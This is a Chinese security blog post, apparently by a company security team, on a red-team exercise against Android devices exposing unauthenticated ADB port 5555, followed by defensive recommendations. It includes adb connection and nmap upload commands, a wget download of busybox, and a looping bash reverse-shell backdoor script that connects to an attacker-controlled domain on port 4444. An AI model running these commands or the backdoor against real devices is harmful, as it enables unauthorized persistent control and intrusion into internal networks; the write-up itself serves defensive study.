在大型企业内网中，接入了大量的终端设备，它们种类繁多：智能手机、打印机、电视机、电视盒子、智能音箱、广告屏、空气净化器 ... 这些嵌入式Linux设备为内网安全带来了新的隐患，通常无法部署常规基于主机的HIDS。本文介绍爱奇艺安全团队在攻防演练中，利用ADB远程调试端口，向内网Android设备植入后门，用于持久控制内网设备，开展后续渗透活动。


ADB调试端口未授权访问

某些基于Android的设备中（常见于TV盒子），默认开启了远程调试端口（5555端口），这将导致设备轻易地被黑客控制，获取一个shell。这类设备极易成为蠕虫感染的目标，成为挖矿设备，组成僵尸网络。如下图所示，该设备的5555端口未授权访问，可被远程控制


获取设备信息

下载 Android SDK Platform Tools，连接到设备

root@dev:~/platform-tools# ./adb connect xxxx:5555* daemon not running; starting now at tcp:5037* daemon started successfullyconnected to xxxx:5555

获取设备基本信息，主要是处理器、Android版本，用于下载对应版本的nmap、编译HTTP代理程序。

root@dev:~/platform-tools# ./adb shell getprop ro.product.cpu.abiarmeabi-v7a

也可以执行

root@dev:~/platform-tools# ./adb shell getprop ro.build.version.release4.4.2root@dev:~/platform-tools# ./adb shell getprop ro.build.version.sdk19


Nmap扫描内网

控制一台Android设备后，我们可以下载nmap来扫描内网，收集基本信息。根据上述设备信息，下载对应的nmap

https://github.com/kost/nmap-android/releases

如图所示，选择 nmap-7.12-android-arm-bin.tar.bz2

解压后上传到设备中

root@dev:~/platform-tools# ./adb push ./nmap-7.12/. /data/test-nmap

测试设备是否可以连通，扫描敏感的内网网段，下图以扫描 security.iqiyi.com 示例

此时，往往已经可以使用该Android设备来探测内网信息了。


植入反弹shell后门

为了能够持续地在外部控制该设备，我们在设备中留下简单的反弹shell后门。因为系统中自带的命令较少，缺失常用的命令，建议下载一个busybox到受控的设备中，丰富可以使用的命令

root@56iqDS:/data/test-nmap # wget --no-check-certificate https://busybox.net/downloads/binaries/1.31.0-defconfig-multiarch-musl/busybox-armv7lroot@56iqDS:/data/test-nmap # chmod 0777 busybox-armv7lroot@56iqDS:/data/test-nmap # ./busybox-armv7lBusyBox v1.31.0 (2019-06-10 15:54:50 CEST) multi-call binary.

我们利用bash 重定向来反弹一个shell到外部黑客的主机。Android中常见的默认shell是mksh，不支持 /dev/tcp 伪文件

root@56iqDS:/data/test-nmap # sh -v# Copyright (c) 2010, 2012, 2013#       Thorsten Glaser <tg@mirbsd.org># This file is provided under the same terms as mksh.#-# Minimal /system/etc/mkshrc for Android## Support: https://launchpad.net/mksh

我们需要上传一个静态编译的bash到Android设备中，写入如下shell脚本

#!/data/test-nmap/bashwhile truedo  r_ip=$(ping -c 1 hacker.controlled.domain | grep -E 'PING.*([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)' -o | grep -E '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' -o)  echo $(date)": connect "$r_ip >> ./output.txt  /data/test-nmap/bash -i >& /dev/tcp/$r_ip/4444 0>&1 &  export r_shell_pid=$!  sleep 600  kill -9 $r_shell_piddone
/data/test-nmap/bash reverse_shell.sh &> ./output.txt  &

通过域名动态IP的形式，实现了在任意IP远程控制该Android设备。

因为测试过程观察到出现shell假死（可能是因为网络IO不稳定），因此我们每隔10分钟会kill一次bash，再次尝试重连。这样，可以保证在任何时刻，任意位置都能反弹成功。如下图所示，广告屏幕和华为手机，都能稳定上线到海外新加坡的VPS。并且当我们修改hacker.controlled.domain域名解析时，在新的IP上监听端口，依然可以反弹成功。


为了能够方便地内网渗透，还可以：

  • 编译代理程序，在Android设备中开启一个正向HTTP代理，将该端口映射到黑客的主机

  • 安装SSH Server，映射端口到黑客主机，利用SSH生成一个socks代理


总结

本文主要介绍了ADB调试端口未授权访问的严重风险，攻防演练中攻击方的一般手法。

在检测防护方面，需要开展以下工作：

  • 漏洞治理：扫描发现ADB远程调试端口未授权访问，提单修复，减少漏洞暴露窗口

  • 网络隔离：将打印机、电视盒子等IoT设备，划分到单独的VLAN，通过防火墙进行必要的隔离

  • 准入控制：严格的准入控制、设备安全扫描

  • NIDS：检出设备主动外联反弹shell，检出设备nmap扫描

  • 威胁情报：检出设备外连域名、IP异常

  • Android设备：要求安装辅助安全工具
